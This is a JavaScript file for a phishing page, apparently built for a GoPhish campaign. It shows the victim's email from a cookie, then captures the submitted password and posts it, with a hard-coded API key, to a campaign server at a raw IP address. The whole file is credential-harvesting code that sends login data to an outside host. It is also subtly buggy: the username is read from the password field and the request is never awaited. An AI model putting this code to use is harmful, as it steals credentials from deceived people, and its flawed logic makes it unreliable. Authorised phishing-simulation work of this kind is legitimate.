


// Replace these values with your actual GoPhish endpoint URL and campaign ID
const gophishEndpoint = "https://35.180.135.50:3333/campaigns/9/results";
const apiKey = "e5b02221380767eecb94274d08032c747a2ddc21decfea65a28bb06c6b40220d"; // If your GoPhish endpoint requires an API key

document.getElementById("current_user").innerHTML = getCookie("email")
function getCookie(name) {
    // Get all cookies.
    let cookies = document.cookie.split(";");

    // Loop through the cookies and find the one with the given name.
    for (let cookie of cookies) {
        let parts = cookie.split("=");

        if (parts[0] == name) {
            // Return the value of the cookie.
            return parts[1];
        }
    }

    // The cookie was not found.
    return null;
}
document.getElementById("pijl").addEventListener("click",()=>
{
    window.location.href = "login.html"
})

document.getElementById("btn_sent").addEventListener("click", (e) => {
    e.preventDefault();

    const username = document.getElementById("password").value;
    const password = document.getElementById("password").value;

    const payload = {
        username: username,
        password: password,
    };

    try {
        const response = fetch(gophishEndpoint, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apiKey}`,
            },
            body: JSON.stringify(payload),
        });

        if (response.ok) {
            console.log("Credentials sent to GoPhish successfully.");
            // Redirect the user to a legitimate page or take any other action
        } else {
            console.error("Error sending credentials to GoPhish.");
        }
    } catch (error) {
        console.error("An error occurred:", error);
    }
});
